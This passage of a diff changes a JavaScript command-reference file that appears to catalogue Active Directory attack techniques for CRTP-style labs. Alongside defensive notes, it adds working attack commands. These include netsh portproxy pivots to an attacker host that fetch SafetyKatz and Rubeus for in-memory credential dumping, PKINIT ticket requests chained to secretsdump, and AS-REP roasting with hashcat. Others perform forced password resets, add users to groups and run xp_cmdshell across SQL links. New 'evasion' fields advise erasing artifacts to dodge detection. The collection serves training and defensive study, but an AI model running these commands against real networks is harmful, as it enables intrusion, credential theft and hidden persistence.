         "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering — block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring — detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection — detect reverse tunnels in HTTPS streams"
       },
       "type": "command"
+    },
+    {
+      "id": "crtp-portproxy-pivot",
+      "name": "Pivoting with netsh portproxy + winrs",
+      "command": "netsh interface portproxy add v4tov4 listenport=<listen_port> listenaddress=0.0.0.0 connectport=<dst_port> connectaddress=<attacker_ip>",
+      "description": "Reach hosts that can't talk to your attack box directly by turning a compromised jump host into a relay. netsh portproxy forwards a local port on the jump host to your web server, so tools like Loader.exe on the deep host can fetch payloads from http://127.0.0.1:<port>/. Commands are driven remotely over winrs.",
+      "platform": "windows",
+      "category": "Active Directory",
+      "subcategory": "Lateral Movement",
+      "type": "command",
+      "certifications": [
+        "CRTP"
+      ],
+      "source": "CRTP",
+      "opsec": "moderate",
+      "mitre": [
+        "T1090.001",
+        "T1021.006"
+      ],
+      "tools": [
+        "netsh",
+        "winrs",
+        "Loader.exe"
+      ],
+      "tags": [
+        "pivoting",
+        "portproxy",
+        "winrs",
+        "port-forwarding",
+        "relay",
+        "crtp"
+      ],
+      "variations": [
+        {
+          "label": "Add a portproxy on the jump host (remote via winrs)",
+          "command": "winrs -r:<jump_host> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<attacker_ip>"
+        },
+        {
+          "label": "Fetch + run a tool through the proxy on the deep host",
+          "command": "winrs -r:<deep_host> C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/<tool>.exe \"<args>\" \"exit\""
+        },
+        {
+          "label": "Stage the loader to the deep host first",
+          "command": "echo F | xcopy C:\\AD\\Tools\\Loader.exe \\\\<deep_host>\\C$\\Users\\Public\\Loader.exe /Y"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Copy Loader to the jump/deep host",
+          "command": "echo F | xcopy C:\\Users\\Public\\Loader.exe \\\\dcorp-mgmt\\C$\\Users\\Public\\Loader.exe"
+        },
+        {
+          "label": "On the jump host, forward 8080 -> your web server:80",
+          "command": "$null | winrs -r:dcorp-mgmt \"netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x\""
+        },
+        {
+          "label": "Run SafetyKatz via the proxy (fileless)",
+          "command": "$null | winrs -r:dcorp-mgmt \"cmd /c C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit\""
+        }
+      ],
+      "examples": [
+        {
+          "label": "Reach the DC through dcorp-mgmt",
+          "command": "winrs -r:dcorp-dc cmd /c \"netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x\""
+        },
+        {
+          "label": "Loader monitor through the proxy",
+          "command": "C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap"
+        }
+      ],
+      "notes": "Used throughout CRTP when a deep host (dcorp-mgmt, dcorp-dc) can't reach the student web server directly - the compromised intermediary becomes the relay. Pair with winrs for remote command execution and Loader.exe for fileless assembly loading over 127.0.0.1. Remove the portproxy afterward: netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0.",
+      "references": [
+        {
+          "title": "CRTP - Attacking and Defending AD (lab)",
+          "url": "https://www.alteredsecurity.com/adlab"
+        },
+        {
+          "title": "MITRE ATT&CK T1090.001 - Internal Proxy",
+          "url": "https://attack.mitre.org/techniques/T1090/001/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "crtp-psremoting",
+          "note": "winrs/PSRemoting is how you drive the jump host",
+          "rel": "prereq"
+        },
+        {
+          "id": "crtp-loader",
+          "note": "Loader fetches assemblies through the 127.0.0.1 proxy",
+          "rel": "next"
+        },
+        {
+          "id": "crtp-credential-dumping",
+          "note": "Run SafetyKatz on the deep host via the proxy",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "prerequisites": "Admin/remoting rights on the jump host (to run netsh and winrs). WinRM (5985) reachable to the jump host; the jump host can reach both you and the deep target.",
+        "why_it_works": "netsh interface portproxy is a built-in Windows userland TCP forwarder; combined with WinRM remote execution it lets a compromised host relay arbitrary traffic between network segments that are otherwise isolated - no third-party tooling needed (living off the land).",
+        "misconfiguration": "WinRM broadly enabled; local admins able to create portproxy rules; flat networks / no segmentation between tiers; egress from servers to attacker infrastructure permitted.",
+        "impact": "Bridges network segmentation - lets the attacker reach and execute on isolated DCs/servers and pull fileless payloads into them, extending compromise deep into the environment.",
+        "detection": "Creation of portproxy rules (netsh interface portproxy add) - Sysmon 1 / 4688 command line; the iphlpsvc portproxy registry key (HKLM\\...\\PortProxy\\v4tov4). WinRM (5985) sessions issuing netsh/loader commands; unexpected listening ports on servers; loopback HTTP fetches of .exe.",
+        "artifacts": "PortProxy registry entries; netsh command lines in process logs; WSMan/WinRM operational logs; new listeners (netstat) on the jump host.",
+        "vulnerable_config": "# WinRM enabled on servers; local admins can run netsh\n# Flat network, servers can reach the internet/attacker\n# No alerting on portproxy creation",
+        "secure_config": "# Restrict WinRM to management subnets/jump servers (IPSec/firewall)\n# Network segmentation + host firewall deny east-west\n# Alert on 'netsh interface portproxy add' and PortProxy registry writes\n# Egress filtering from server tiers",
+        "prevention": "Segment the network and restrict WinRM to PAWs; block server egress to untrusted hosts; alert on portproxy rule creation and WinRM-driven netsh. [MITRE M1030, M1037, M1042]",
+        "evasion": "Uses only built-in tools (netsh/winrs) so blends with admin activity; tear down the portproxy rule after use to remove the artifact.",
+        "sources": [
+          "CRTP",
+          "MITRE T1090.001",
+          "MITRE T1021.006"
+        ]
+      }
     },
     {
       "id": "cdsa-m06-pki-esc1",
@@ -49566,7 +52120,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "An ADCS certificate template is misconfigured with ESC1 conditions: (1) 'Enrollee supplies subject' (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) is enabled, allowing the requester to specify any SAN (Subject Alternative Name) — including a Domain Admin UPN; (2) Low-privilege users (Domain Users, Authenticated Users) have Enroll or AutoEnroll rights on the template; (3) Client Authentication EKU is set. This lets any domain user request a certificate that authenticates as any other user.",
         "vulnerable_config": "# Certificate template properties (via Certify or ADCS MMC):\n# Template: UserWebAuth\n#   Subject Name: 'Supply in the request' (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 1)\n#   EKU: Client Authentication (1.3.6.1.5.5.7.3.2)\n#   Enrollment: Domain Users (Enroll)\n# -> Any domain user can request a cert claiming UPN administrator@corp.local\n\n# Certify scan:\n# Certify.exe find /vulnerable\n# [+] ESC1: UserWebAuth  -- 'Supply in request', Domain Users Enroll, Client Auth",
-        "secure_config": "# Fix CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT:\n# ADCS MMC -> Certificate Templates -> UserWebAuth -> Properties\n# Subject Name tab -> change 'Supply in the request' to\n#   'Build from this Active Directory information'\n\n# Remove broad enrollment rights:\n# Security tab -> remove 'Domain Users' -> add only the specific group that needs the cert\n\n# Enable CA Manager Approval for sensitive templates:\n# Issuance Requirements tab -> 'CA certificate manager approval' = checked\n# This requires a human review before each certificate is issued\n\n# Run Certify/PSPKIAudit quarterly to detect new vulnerable templates:\n# Invoke-PKIAudit\n\n# Enforce SID extension (Windows Server 2022+):\n# Prevents certificate from authenticating as another user even with alt SAN"
+        "secure_config": "# Fix CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT:\n# ADCS MMC -> Certificate Templates -> UserWebAuth -> Properties\n# Subject Name tab -> change 'Supply in the request' to\n#   'Build from this Active Directory information'\n\n# Remove broad enrollment rights:\n# Security tab -> remove 'Domain Users' -> add only the specific group that needs the cert\n\n# Enable CA Manager Approval for sensitive templates:\n# Issuance Requirements tab -> 'CA certificate manager approval' = checked\n# This requires a human review before each certificate is issued\n\n# Run Certify/PSPKIAudit quarterly to detect new vulnerable templates:\n# Invoke-PKIAudit\n\n# Enforce SID extension (Windows Server 2022+):\n# Prevents certificate from authenticating as another user even with alt SAN",
+        "evasion": "Request the certificate once and use it for the TGT; delete the local .pfx/.pem after; ESC relays are noisy — trigger the coercion briefly."
       }
     },
     {
@@ -49672,13 +52227,14 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The MS-EFSRPC interface (LSARPC/EfsRpcOpenFileRaw) allows unauthenticated (or authenticated in older variants) callers to coerce a Windows machine into authenticating to an arbitrary host via NTLM. When combined with an ADCS web enrollment endpoint (http://CA/certsrv/) that does not require HTTPS or Extended Protection for Authentication (EPA), the relayed authentication can be used to request a certificate for the DC machine account — which can then be used to obtain a TGT and perform DCSync.",
         "vulnerable_config": "# ADCS web enrollment without EPA or HTTPS:\n# URL reachable: http://CA01/certsrv/  (no HTTPS redirect)\n# EPA (Extended Protection for Authentication) = NOT configured\n\n# IIS applicationHost.config (vulnerable):\n# <security><authentication><windowsAuthentication>\n#   <extendedProtection tokenChecking=\"None\" />\n# </windowsAuthentication></authentication></security>\n\n# MS-EFSRPC coercion: unauthenticated (pre-patch) or low-priv user can call:\n# EfsRpcOpenFileRaw(\\\\attacker@443\\share) -> DC authenticates outbound",
-        "secure_config": "# Fix 1 — Enable EPA on ADCS web enrollment (IIS):\n# IIS Manager -> certsrv site -> Authentication -> Windows Auth -> Providers\n# Set Extended Protection to 'Required'\n# OR via command:\nImport-Module WebAdministration\nSet-WebConfigurationProperty -Filter '//security/authentication/windowsAuthentication' \\\n    -Name extendedProtection -Value @{tokenChecking='Require'} -PSPath 'IIS:\\\\' -Location 'Default Web Site/certsrv'\n\n# Fix 2 — Enable HTTPS only on certsrv:\nNew-WebBinding -Name 'Default Web Site' -Protocol https -Port 443\n# Redirect HTTP to HTTPS\n\n# Fix 3 — Patch MS-EFSRPC: KB5005413 (Aug 2021)\n# Fix 4 — Enable SMB signing on all hosts (blocks NTLM relay)\n# GPO: 'Microsoft network server: Digitally sign communications (always)' = Enabled"
+        "secure_config": "# Fix 1 — Enable EPA on ADCS web enrollment (IIS):\n# IIS Manager -> certsrv site -> Authentication -> Windows Auth -> Providers\n# Set Extended Protection to 'Required'\n# OR via command:\nImport-Module WebAdministration\nSet-WebConfigurationProperty -Filter '//security/authentication/windowsAuthentication' \\\n    -Name extendedProtection -Value @{tokenChecking='Require'} -PSPath 'IIS:\\\\' -Location 'Default Web Site/certsrv'\n\n# Fix 2 — Enable HTTPS only on certsrv:\nNew-WebBinding -Name 'Default Web Site' -Protocol https -Port 443\n# Redirect HTTP to HTTPS\n\n# Fix 3 — Patch MS-EFSRPC: KB5005413 (Aug 2021)\n# Fix 4 — Enable SMB signing on all hosts (blocks NTLM relay)\n# GPO: 'Microsoft network server: Digitally sign communications (always)' = Enabled",
+        "evasion": "Request the certificate once and use it for the TGT; delete the local .pfx/.pem after; ESC relays are noisy — trigger the coercion briefly."
       }
     },
     {
       "id": "ptc-gettgt",
       "name": "PKINITtools - Get TGT from Certificate",
-      "command": "python3 gettgtpkinit.py -cert-pfx <file.pfx> -pfx-pass '<pfx_pass>' -dc-ip <dc_ip> <domain>/<user> <output.ccache>",
+      "command": "python3 gettgtpkinit.py -cert-pfx <pfx_file> -pfx-pass '<pfx_pass>' -dc-ip <dc_ip> <domain>/<user> <ccache>",
       "description": "Uses a PFX certificate (from ADCS relay or shadow credentials) to request a Kerberos TGT via PKINIT. Set KRB5CCNAME to the resulting ccache, then authenticate to services or run DCSync as the certificate's principal.",
       "platform": "linux",
       "requires": [
@@ -49767,7 +52323,23 @@ const COMMAND_DATA = {
         "vulnerable_config": "# msDS-KeyCredentialLink writable by attacker (GenericWrite on target account):\n# pywhisker.py -t targetuser -a add\n# Adds a fake device credential -> obtain certificate for targetuser\n# -> PKINIT TGT as targetuser -> NTLM hash via UnPAC\n\n# LSASS memory contains TGTs for all logged-in users:\n# Mimikatz: sekurlsa::tickets /export\n# Rubeus: dump /all",
         "secure_config": "# Prevent msDS-KeyCredentialLink abuse:\n# Audit who has GenericWrite on privileged accounts\n# Only SYSTEM/DCs should write msDS-KeyCredentialLink\nGet-ObjectAcl -Identity admin -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'Write'}\n\n# Prevent ticket extraction:\n# Enable Credential Guard (blocks LSASS memory reads)\n# Protected Users group members: tickets not cached in LSASS\n\n# ADCS: prevent ESC1/ESC8 (see those cards)\n# Monitor: Event 4768 with certificate auth, Event 4769 unusual ticket lifetimes"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "From PEM",
+          "command": "python3 gettgtpkinit.py -cert-pem <cert_pem> -key-pem <key_pem> <domain>/<user> tgt.ccache"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Request a TGT with the PFX",
+          "command": "python3 gettgtpkinit.py -cert-pfx <pfx_file> -pfx-pass <pw> <domain>/<user> tgt.ccache"
+        },
+        {
+          "label": "Use it",
+          "command": "export KRB5CCNAME=tgt.ccache; secretsdump.py -k -no-pass <domain>/<user>@<dc_fqdn>"
+        }
+      ]
     },
     {
       "id": "plink-dynamic",
@@ -49846,7 +52418,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "plink.exe (PuTTY CLI) establishes SSH dynamic/port forwarding from a Windows pivot where a native SSH client is absent.",
+        "why_it_works": "plink (PuTTY's CLI) opens an SSH dynamic (SOCKS) tunnel from Windows, so traffic proxied through it reaches internal hosts via the pivot's network position.",
         "prerequisites": "plink on a Windows pivot and SSH access to a host that reaches the target network.",
         "impact": "SOCKS/port-forward pivoting from Windows into internal networks.",
         "detection": "[MITRE T1090.001] A compromised host relaying traffic between segments it shouldn't bridge; an unexpected listening port (SOCKS/forwarder) on the pivot; the pivot initiating connections to hosts/ports it never normally contacts; lateral flows that appear to originate from the pivot (NetFlow/east-west monitoring).",
@@ -49861,7 +52433,13 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy — direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
         "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering — block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring — detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection — detect reverse tunnels in HTTPS streams"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Reverse via plink -R",
+          "command": "plink -ssh -R <rport>:<int_target>:<int_port> <user>@<attacker>"
+        }
+      ]
     },
     {
       "type": "command",
@@ -50143,7 +52721,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Credentials are stored in plaintext in browser saved passwords, application config files, scripts, log files, and SMB shares. Network captures contain cleartext protocol credentials (FTP, HTTP Basic, LDAP simple bind). No DLP (Data Loss Prevention) monitoring prevents credential exfiltration.",
         "vulnerable_config": "# Firefox saved passwords (no master password set):\n# ~/.mozilla/firefox/*/logins.json -> decryptable with firefox-decrypt\n# All saved site passwords accessible without any authentication\n\n# Cleartext passwords in network capture:\n# tcpdump/Wireshark: FTP, HTTP Basic, LDAP simple bind all transmit creds in cleartext\n# tshark -r capture.pcap -Y 'ftp.request.command==\"PASS\"' -T fields -e ftp.request.arg",
-        "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud"
+        "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud",
+        "evasion": "Read files directly instead of staging tools; scope the search to likely directories; where a tool binary is signatured, copy the artifact off-host and process it on your box."
       },
       "type": "command"
     },
@@ -50220,7 +52799,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Non-privileged users or groups have been granted sensitive AD object permissions (WriteDACL, GenericAll, GenericWrite, ForceChangePassword, AddMember, etc.) through misconfigured delegation, 'inherited from parent' ACEs copied at provisioning time, or direct one-off grants. Because AD ACEs are not surfaced in the normal GUI, these often persist for years.",
         "vulnerable_config": "# Example: a help-desk group has ForceChangePassword on Domain Admins members\n# Found via BloodHound 'ForceChangePassword' edge, or PowerView:\nGet-ObjectAcl -Identity 'Domain Admins' -ResolveGUIDs |\n  Where-Object {$_.ActiveDirectoryRights -match 'ResetPassword'} |\n  Select-Object IdentityReference, ActiveDirectoryRights, ObjectType\n\n# Another dangerous pattern — GenericWrite on a user (enables targeted Kerberoasting):\nGet-ObjectAcl -Identity 'svc_sql' -ResolveGUIDs |\n  Where-Object {$_.ActiveDirectoryRights -match 'GenericWrite'}",
-        "secure_config": "# 1. Run AD ACL audit quarterly (automated):\n# BloodHound: Mark all Domain Admins as 'High Value', find paths from low-priv users\n# PowerView batch:\nGet-DomainObjectAcl -ResolveGUIDs |\n  Where-Object {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDACL|WriteOwner'} |\n  Where-Object {$_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|SYSTEM'} |\n  Export-Csv acl_review.csv\n\n# 2. Remove dangerous ACEs:\nRemove-DomainObjectAcl -TargetIdentity 'svc_sql' \\\n    -PrincipalIdentity 'helpdesk' -Rights GenericWrite\n\n# 3. Enable AD Protected Users group for privileged accounts\n# 4. Use tiered administration (Admin Tier 0/1/2) to limit blast radius"
+        "secure_config": "# 1. Run AD ACL audit quarterly (automated):\n# BloodHound: Mark all Domain Admins as 'High Value', find paths from low-priv users\n# PowerView batch:\nGet-DomainObjectAcl -ResolveGUIDs |\n  Where-Object {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDACL|WriteOwner'} |\n  Where-Object {$_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|SYSTEM'} |\n  Export-Csv acl_review.csv\n\n# 2. Remove dangerous ACEs:\nRemove-DomainObjectAcl -TargetIdentity 'svc_sql' \\\n    -PrincipalIdentity 'helpdesk' -Rights GenericWrite\n\n# 3. Enable AD Protected Users group for privileged accounts\n# 4. Use tiered administration (Admin Tier 0/1/2) to limit blast radius",
+        "evasion": "Make the DACL/attribute change, use it, then REVERT it (remove the added SPN/rights) to erase the persistence artifact; a single scoped edit is low-signal without object auditing."
       },
       "tools": [
         "powershell"
@@ -50261,10 +52841,6 @@ const COMMAND_DATA = {
         "T1046"
       ],
       "variations": [
-        {
-          "label": "Ports 1-1024",
-          "command": "1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect(\"<ip>\", $_)) \"TCP port $_ is open\"} 2>$null"
-        },
         {
           "label": "Custom range",
           "command": "<port_start>..<port_end> | % {echo ((New-Object Net.Sockets.TcpClient).Connect(\"<ip>\", $_)) \"TCP port $_ is open\"} 2>$null"
@@ -50367,10 +52943,6 @@ const COMMAND_DATA = {
         "T1046"
       ],
       "variations": [
-        {
-          "label": "Single port check",
-          "command": "Test-NetConnection -Port <port> <ip>"
-        },
         {
           "label": "Alias (shorter)",
           "command": "tnc <ip> -Port <port>"
@@ -50615,7 +53187,7 @@ const COMMAND_DATA = {
           "rel": "alternative"
         }
       ],
-      "notes": "Key findings: unquoted paths, CanRestart service misconfigs, AlwaysInstallElevated, cached Autologon creds.",
+      "notes": "Key findings: unquoted paths, CanRestart service misconfigs, AlwaysInstallElevated, cached Autologon creds. winPEAS/PrivEscCheck are broader local-enum alternatives to PowerUp; run winPEAS in-memory via Loader to avoid disk writes.",
       "references": [
         {
           "title": "CRTP - Local PrivEsc with PowerUp",
@@ -50638,7 +53210,21 @@ const COMMAND_DATA = {
         "misconfiguration": "AlwaysInstallElevated enabled in registry (both HKLM and HKCU). Service binary directories writable by standard users. Unquoted service paths with spaces in directory names. Service DACLs allow standard users to reconfigure services.",
         "vulnerable_config": "# AlwaysInstallElevated enabled (BOTH keys must be set for exploitation):\n(Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer').AlwaysInstallElevated  # 1\n(Get-ItemProperty 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer').AlwaysInstallElevated  # 1\n# Both = 1 → MSI files run as SYSTEM = CRITICAL\n\n# Unquoted service path with space:\nsc qc 'Vulnerable Service'\n# BINARY_PATH_NAME: C:\\Program Files\\Some Company\\service.exe\n# → Windows tries: C:\\Program.exe, C:\\Program Files\\Some.exe, etc.\n\n# Writable service binary:\nicacls 'C:\\Program Files\\VulnApp\\service.exe'\n# Everyone:(F) → anyone can replace the binary",
         "secure_config": "# Disable AlwaysInstallElevated via GPO:\n# Computer Config → Admin Templates → Windows Components → Windows Installer\n# → Always install with elevated privileges: Disabled\n# HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated = 0\n\n# Fix unquoted service paths:\nGet-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '\"' -and $_.PathName -match ' '} | ForEach-Object {\n  $quoted = '\"' + $_.PathName + '\"'\n  sc.exe config $_.Name binpath= $quoted\n}\n\n# Fix service binary permissions:\n# icacls 'C:\\Program Files\\VulnApp\\service.exe' /inheritance:d\n# icacls 'C:\\Program Files\\VulnApp\\service.exe' /remove 'Everyone'\n# icacls 'C:\\Program Files\\VulnApp\\service.exe' /grant:r 'SYSTEM:(F)' 'Administrators:(F)'\n\n# Regular PrivEsc audit:\nIEX (New-Object Net.WebClient).DownloadString('https://internal-repo/PowerUp.ps1')\nInvoke-AllChecks | Where-Object {$_.AbuseFunction} | Format-List"
-      }
+      },
+      "variations": [
+        {
+          "label": "winPEAS in-memory via Loader",
+          "command": "Loader.exe -Path <winpeas_exe> -args notcolor log"
+        },
+        {
+          "label": "PrivEscCheck",
+          "command": ". <script_ps1>; Invoke-PrivescCheck"
+        },
+        {
+          "label": "Service abuse (writable service)",
+          "command": "Invoke-ServiceAbuse -Name '<service>' -UserName '<domain>\\<user>' -Verbose"
+        }
+      ]
     },
     {
       "id": "ad-powerupsql",
@@ -50728,6 +53314,26 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PowerUpSQL"
+      ],
+      "variations": [
+        {
+          "label": "Audit for privesc",
+          "command": "Invoke-SQLAudit -Verbose"
+        },
+        {
+          "label": "Crawl links + run OS command",
+          "command": "Get-SQLServerLinkCrawl -Instance <instance> -Query 'exec master..xp_cmdshell ''whoami'''"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Discover reachable instances",
+          "command": "Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded"
+        },
+        {
+          "label": "Audit each for escalation paths",
+          "command": "Invoke-SQLAudit -Verbose"
+        }
       ]
     },
     {
@@ -50808,6 +53414,30 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PowerView"
+      ],
+      "variations": [
+        {
+          "label": "net rpc (Linux)",
+          "command": "net rpc password <target_user> -U <domain>/<user>%<password> -S <dc_ip>"
+        },
+        {
+          "label": "AD module",
+          "command": "Set-ADAccountPassword -Identity <target_user> -Reset -NewPassword (ConvertTo-SecureString '<new>' -AsPlainText -Force)"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Confirm ForceChangePassword right",
+          "command": "Get-DomainObjectAcl -Identity <target_user> -ResolveGUIDs | ?{$_.ObjectAceType -match 'Force-Change-Password'}"
+        },
+        {
+          "label": "Build a SecureString",
+          "command": "$newpw = ConvertTo-SecureString '<new_password>' -AsPlainText -Force"
+        },
+        {
+          "label": "Reset the target's password",
+          "command": "Set-DomainUserPassword -Identity <target_user> -AccountPassword $newpw -Credential $Cred"
+        }
       ]
     },
     {
@@ -50904,6 +53534,30 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PowerView"
+      ],
+      "variations": [
+        {
+          "label": "net (if you have the rights interactively)",
+          "command": "net group \"<group>\" <user> /add /domain"
+        },
+        {
+          "label": "AD module",
+          "command": "Add-ADGroupMember -Identity '<group>' -Members '<user>'"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Confirm GenericAll/GenericWrite on the group",
+          "command": "Get-DomainObjectAcl -Identity '<group>' -ResolveGUIDs | ?{$_.SecurityIdentifier -eq (Convert-NameToSid <user>)}"
+        },
+        {
+          "label": "Add yourself to the group",
+          "command": "Add-DomainGroupMember -Identity '<group>' -Members '<user>' -Credential $Cred"
+        },
+        {
+          "label": "Verify membership",
+          "command": "Get-DomainGroupMember -Identity '<group>' | select MemberName"
+        }
       ]
     },
     {
@@ -50995,6 +53649,26 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PowerView"
+      ],
+      "variations": [
+        {
+          "label": "Filter to interesting rights",
+          "command": "Get-DomainObjectAcl -Identity <object> -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner|GenericWrite'}"
+        },
+        {
+          "label": "Who has rights over Domain Admins",
+          "command": "Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs -Verbose"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Resolve the principal you control to a SID",
+          "command": "$sid = Convert-NameToSid <user>"
+        },
+        {
+          "label": "Find what that SID can modify",
+          "command": "Get-DomainObjectAcl -ResolveGUIDs -Identity <object> | ?{$_.SecurityIdentifier -eq $sid}"
+        }
       ]
     },
     {
@@ -51160,6 +53834,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PowerView"
+      ],
+      "variations": [
+        {
+          "label": "Try blank password on those accounts",
+          "command": "crackmapexec smb <dc_ip> -u <user> -p ''"
+        }
       ]
     },
     {
@@ -51244,6 +53924,30 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PowerView"
+      ],
+      "variations": [
+        {
+          "label": "Targeted AS-REP (set the UAC flag if you have write)",
+          "command": "Set-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose"
+        },
+        {
+          "label": "Revert the flag after roasting",
+          "command": "Set-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Find accounts without pre-auth",
+          "command": "Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname"
+        },
+        {
+          "label": "Roast with Rubeus",
+          "command": ".\\Rubeus.exe asreproast /user:<user> /format:hashcat /nowrap /outfile:asrep.txt"
+        },
+        {
+          "label": "Crack offline",
+          "command": "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
+        }
       ]
     },
     {
@@ -51327,6 +54031,30 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PowerView"
+      ],
+      "variations": [
+        {
+          "label": "Foreign users (our principals in their groups)",
+          "command": "Get-DomainForeignUser -Domain <foreign_domain>"
+        },
+        {
+          "label": "Map all trusts first",
+          "command": "Get-DomainTrustMapping"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Find principals from our domain in the foreign domain's groups",
+          "command": "Get-DomainForeignGroupMember -Domain <foreign_domain>"
+        },
+        {
+          "label": "Resolve the member SID",
+          "command": "ConvertFrom-SID <member_sid>"
+        },
+        {
+          "label": "Abuse that access across the trust",
+          "command": "# use the account's rights in the foreign domain"
+        }
       ]
     },
     {
@@ -51441,6 +54169,26 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PowerView"
+      ],
+      "variations": [
+        {
+          "label": "Only ACLs involving principals you control",
+          "command": "Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match '<user>|<group>'}"
+        },
+        {
